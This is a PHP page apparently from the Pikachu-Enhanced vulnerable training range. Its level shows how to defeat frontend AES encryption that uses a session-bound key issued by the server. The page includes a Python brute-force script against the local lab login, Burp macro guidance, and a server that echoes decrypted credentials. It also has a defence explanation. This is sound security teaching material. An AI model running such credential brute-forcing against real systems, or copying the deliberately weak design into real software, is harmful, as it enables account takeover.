<?php
/**
 * Pikachu-Enhanced v2.0 - 前端加解密对抗: Level 2 - AES 服务端动态 Key
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/encrypt_helper.inc.php';

// 处理 POST 解密请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $encryptedData = $_POST['encryptedData'] ?? null;
    if (!$encryptedData) {
        $rawJson = json_decode(file_get_contents('php://input'), true);
        $encryptedData = $rawJson['encryptedData'] ?? null;
    }

    if ($encryptedData) {
        if (!isset($_SESSION['aes_key']) || !isset($_SESSION['aes_iv'])) {
            echo json_encode([
                'success' => false,
                'error' => '当前会话中未找到有效的动态密钥，请先调用 server_generate_key.php 获取会话密钥'
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $key = base64_decode($_SESSION['aes_key']);
        $iv  = base64_decode($_SESSION['aes_iv']);
        $ciphertext = base64_decode($encryptedData);
        $decrypted = openssl_decrypt($ciphertext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);

        if ($decrypted === false) {
            echo json_encode(['success' => false, 'error' => '动态 AES 密文解密失败，可能密钥不匹配或已轮转'], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $formData = json_decode($decrypted, true);
        if (isset($formData['username'], $formData['password'])) {
            $authRes = pika_encrypt_verify_user($formData['username'], $formData['password']);
            if ($authRes['success']) {
                echo json_encode([
                    'success' => true,
                    'message' => '🎉 动态密钥身份认证成功 (Dynamic AES Login Succeeded)',
                    'username' => $authRes['username'],
                    'decrypted_debug' => $formData
                ], JSON_UNESCAPED_UNICODE);
            } else {
                echo json_encode([
                    'success' => false,
                    'error' => $authRes['error'],
                    'decrypted_debug' => $formData
                ], JSON_UNESCAPED_UNICODE);
            }
            exit;
        } else {
            echo json_encode(['success' => false, 'error' => '解密数据结构异常，缺少必要凭据字段'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    } else {
        echo json_encode(['success' => false, 'error' => '缺少 encryptedData 参数'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$SELF_PAGE = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
if ($SELF_PAGE == "aesserver.php") {
    $ACTIVE = array_fill(0, 360, '');
    $ACTIVE[340] = 'active open';
    $ACTIVE[343] = 'active';
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.crypto-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
}
.inspector-panel {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.6;
    overflow-x: auto;
}
.inspector-title {
    color: #94a3b8;
    font-size: 12px;
    text-transform: uppercase;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.nav-tabs-custom {
    border-bottom: 2px solid #e2e8f0;
    margin-bottom: 20px;
    display: flex;
    gap: 8px;
}
.nav-tabs-custom button {
    background: none;
    border: none;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #64748b;
    border-bottom: 2px solid transparent;
    cursor: pointer;
    transition: all 0.2s;
}
.nav-tabs-custom button.active {
    color: #4f46e5;
    border-bottom-color: #4f46e5;
}
.tab-pane-custom {
    display: none;
}
.tab-pane-custom.active {
    display: block;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="<?php echo $PIKA_ROOT_DIR;?>vul/encrypt/encrypt.php">前端加解密对抗</a></li>
                <li class="active">Level 2 - AES 服务端动态 Key</li>
            </ul>
        </div>

        <div class="page-content">
            <!-- 场景标题与说明 -->
            <div style="margin-bottom: 24px;">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
                    <span class="badge" style="background:#4f46e5; font-size:12px; padding:4px 10px;">Level 2</span>
                    <span class="badge" style="background:#2563eb; font-size:12px; padding:4px 10px;">Dynamic Session Key</span>
                    <span class="badge" style="background:#059669; font-size:12px; padding:4px 10px;">Pre-Flight Key Exchange</span>
                </div>
                <h2 style="font-weight: 800; font-size: 24px; margin: 0 0 8px 0; color: #0f172a;">
                    AES 服务端动态获取 Key 对称加密 (Dynamic Server-Assigned Key)
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    针对静态硬编码密钥容易被搜索提取的弱点，该防御方案设计为：前端在提交前必须先调用 <code>server_generate_key.php</code> 接口，由服务端随机生成一对与当前 Session 绑定的 AES Key 与 IV 下发给前端；前端据此临时密钥加密数据包，服务端依靠保存在会话中的对应密钥解密。
                </p>
            </div>

            <div class="row">
                <!-- 左侧: 交互式登录挑战卡片 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
                            <h4 style="margin:0; font-weight:700; font-size:16px; display:flex; align-items:center; gap:8px;">
                                <i class="ph-bold ph-arrows-clockwise" style="color:#4f46e5;"></i> 双阶动态认证 (Two-Stage Auth)
                            </h4>
                            <button type="button" class="btn btn-xs btn-default" onclick="fetchNewKey()" style="border-radius:6px;">
                                <i class="ph-bold ph-arrow-counter-clockwise"></i> 刷新会话密钥
                            </button>
                        </div>

                        <div id="loginAlert" style="display:none; margin-bottom:16px;"></div>

                        <form id="cryptoLoginForm" onsubmit="handleDynamicSubmit(event)">
                            <div class="form-group" style="margin-bottom:14px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">账号 (Username):</label>
                                <input type="text" id="username" class="form-control" value="admin" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>
                            <div class="form-group" style="margin-bottom:18px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">密码 (Password):</label>
                                <input type="password" id="password" class="form-control" value="123456" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>

                            <button type="submit" id="submitBtn" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:11px; background:#4f46e5; border-color:#4f46e5;">
                                <i class="ph-bold ph-lock-key"></i> 获取会话动态 Key -> 加密并提交
                            </button>
                        </form>
                    </div>

                    <!-- 实时数据流监视器 -->
                    <div class="crypto-card" style="padding: 20px;">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:15px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-broadcast" style="color:#0ea5e9;"></i> 会话与加密流水线实时监视器
                        </h4>
                        
                        <div class="inspector-title"><i class="ph-bold ph-cloud-arrow-down"></i> 阶段 1: 服务端下发的动态密钥 (server_generate_key.php)</div>
                        <div class="inspector-panel" id="inspDynamicKey" style="margin-bottom:12px;">// 提交时自动预取，或点击右上角刷新...</div>

                        <div class="inspector-title"><i class="ph-bold ph-file-text"></i> 阶段 2: 待加密 JSON 负载</div>
                        <div class="inspector-panel" id="inspPlain" style="margin-bottom:12px;">{"username": "admin", "password": "..."}</div>

                        <div class="inspector-title"><i class="ph-bold ph-globe"></i> 阶段 3: 最终抓包密文 (Wire Payload)</div>
                        <div class="inspector-panel" id="inspCipher" style="margin-bottom:12px;">// 等待发送...</div>

                        <div class="inspector-title"><i class="ph-bold ph-cpu"></i> 阶段 4: 服务端解密结果与响应</div>
                        <div class="inspector-panel" id="inspResponse">// 等待服务端响应...</div>
                    </div>
                </div>

                <!-- 右侧: 渗透与对抗指引 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div class="nav-tabs-custom">
                            <button class="active" onclick="switchTab(event, 'tab1')"><i class="ph-bold ph-magnifying-glass"></i> 动态逻辑分析</button>
                            <button onclick="switchTab(event, 'tab2')"><i class="ph-bold ph-wrench"></i> Burp 宏与前置提取</button>
                            <button onclick="switchTab(event, 'tab3')"><i class="ph-bold ph-terminal"></i> Python 会话流脚本</button>
                            <button onclick="switchTab(event, 'tab4')"><i class="ph-bold ph-shield-check"></i> 安全防御机制</button>
                        </div>

                        <!-- Tab 1: 动态逻辑分析 -->
                        <div id="tab1" class="tab-pane-custom active">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🔍 动态密钥分发的执行特征与逆向点</h5>
                            <ol style="font-size:13.5px; color:#475569; line-height:1.8; padding-left:20px;">
                                <li><strong>网络请求链追踪：</strong>打开 DevTools -> Network 标签，观察点击登录瞬间，浏览器首先发出了一个对 <code>server_generate_key.php</code> 的 GET/POST 请求，随后才携带密文提交主请求。</li>
                                <li><strong>会话强绑定机制：</strong>返回的 <code>aes_key</code> 和 <code>aes_iv</code> 是通过 <code>Set-Cookie: PHPSESSID=...</code> 保存在当前会话状态中的。如果爆破脚本发包时不携带相同的 Cookie，服务端将无法找到对应解密密钥。</li>
                                <li><strong>失效判定：</strong>密钥随会话刷新而失效，无法使用单一固定密钥直接进行全字典重放。</li>
                            </ol>
                        </div>

                        <!-- Tab 2: Burp 宏与前置提取 -->
                        <div id="tab2" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛠️ Burp Suite Macro (宏) 与插件联动</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.6;">
                                针对动态密钥，单纯的静态 AutoDecoder 无法处理两步发包。常规对抗方案为：
                            </p>
                            <ul style="font-size:13px; color:#334155; line-height:1.7;">
                                <li><strong>方案 A - Burp Macro (宏请求):</strong> 在 Project Options -> Sessions -> Rules 添加规则，在每次 Intruder 发包前自动请求 <code>server_generate_key.php</code>，提取 Response 中的 key/iv 并更新到加密插件变量中。</li>
                                <li><strong>方案 B - Burp 扩展脚本 (Python/Java):</strong> 编写扩展监听 <code>processHttpMessage</code>，在发送每个 payload 前自动复用会话拉取动态 key 后再加密。</li>
                                <li><strong>方案 C - JSRpc (最推荐):</strong> 通过控制前端页面挂载函数，浏览器内部自动完成获取 Key 与加密，无需在 Burp 中还原复杂密码学逻辑。</li>
                            </ul>
                        </div>

                        <!-- Tab 3: Python 会话流脚本 -->
                        <div id="tab3" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🐍 Python 双阶会话动态爆破脚本</h5>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:14px; font-size:12px; line-height:1.5; max-height:360px; overflow-y:auto;"><code>import json
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BASE_URL = "http://127.0.0.1:8765/vul/encrypt"

session = requests.Session()

# 1. 预先向服务端请求当前会话的动态密钥与 IV
key_resp = session.get(f"{BASE_URL}/server_generate_key.php")
key_data = key_resp.json()
aes_key = base64.b64decode(key_data["aes_key"])
aes_iv  = base64.b64decode(key_data["aes_iv"])
print(f"[*] 成功获取会话动态 Key: {key_data['aes_key']}")

# 2. 编写加密函数
def encrypt_payload(username, password, key, iv):
    payload = json.dumps({"username": username, "password": password}, separators=(',', ':'))
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(payload.encode('utf-8'), AES.block_size))
    return base64.b64encode(enc).decode('utf-8')

# 3. 携带相同会话 Cookie 提交加密登录
test_passwords = ["123", "root", "123456", "admin"]
for pwd in test_passwords:
    ciphertext = encrypt_payload("admin", pwd, aes_key, aes_iv)
    resp = session.post(f"{BASE_URL}/aesserver.php", json={"encryptedData": ciphertext})
    result = resp.json()
    if result.get("success"):
        print(f"[+] 动态认证成功! 密码为: {pwd}")
        break
    else:
        print(f"[-] 密码 [{pwd}] 失败: {result.get('error')}")
</code></pre>
                        </div>

                        <!-- Tab 4: 安全防御机制 -->
                        <div id="tab4" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛡️ 架构本质分析</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.7;">
                                服务端动态下发对称密钥依然存在<strong>“密钥在不受信的客户端信道明文传输”</strong>的根本性安全缺陷。只要攻击者能嗅探或拦截 <code>server_generate_key.php</code> 的响应，密钥即告泄露。<br>
                                真正的现代安全信道协商应采用 <strong>Diffie-Hellman / ECDHE 密钥交换算法</strong> 或直接依靠 HTTPS/TLS 会话层保护，而非在业务层自行设计对称密钥明文下发机制。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="<?php echo $PIKA_ROOT_DIR;?>assets/js/crypto-js.min.js"></script>

<script>
let currentAesKey = null;
let currentAesIv = null;

function switchTab(evt, tabId) {
    document.querySelectorAll('.nav-tabs-custom button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-pane-custom').forEach(p => p.classList.remove('active'));
    evt.currentTarget.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

async function fetchNewKey() {
    try {
        const resp = await fetch('server_generate_key.php');
        const data = await resp.json();
        if (data.aes_key && data.aes_iv) {
            currentAesKey = CryptoJS.enc.Base64.parse(data.aes_key);
            currentAesIv = CryptoJS.enc.Base64.parse(data.aes_iv);
            document.getElementById('inspDynamicKey').textContent = JSON.stringify(data, null, 2);
            return true;
        }
    } catch (e) {
        document.getElementById('inspDynamicKey').textContent = '获取动态 Key 异常: ' + e.message;
    }
    return false;
}

async function handleDynamicSubmit(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 协商动态密钥并加密...';

    // 1. 若当前会话尚未获取 Key，先动态拉取
    if (!currentAesKey || !currentAesIv) {
        const ok = await fetchNewKey();
        if (!ok) {
            alertBox.style.display = 'block';
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 无法从服务器获取会话 AES 密钥！';
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<i class="ph-bold ph-lock-key"></i> 获取会话动态 Key -> 加密并提交';
            return;
        }
    }

    // 2. 构建明文负载
    const payloadObj = { username: username, password: password };
    const jsonStr = JSON.stringify(payloadObj);
    document.getElementById('inspPlain').textContent = jsonStr;

    // 3. 使用服务端下发的动态 Key 执行加密
    const encrypted = CryptoJS.AES.encrypt(jsonStr, currentAesKey, {
        iv: currentAesIv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    }).toString();

    document.getElementById('inspCipher').textContent = JSON.stringify({ encryptedData: encrypted }, null, 2);

    // 4. 提交加密请求
    fetch('aesserver.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ encryptedData: encrypted })
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('inspResponse').textContent = JSON.stringify(data, null, 2);
        alertBox.style.display = 'block';
        if (data.success) {
            alertBox.className = 'alert alert-success';
            alertBox.innerHTML = '<i class="ph-bold ph-check-circle"></i> <strong>' + data.message + '</strong> [' + data.username + '] 登录成功！';
        } else {
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-x-circle"></i> <strong>验证失败:</strong> ' + (data.error || '用户名或密码错误');
        }
    })
    .catch(err => {
        document.getElementById('inspResponse').textContent = 'Request Error: ' + err.message;
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 请求出现网络异常';
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-lock-key"></i> 获取会话动态 Key -> 加密并提交';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
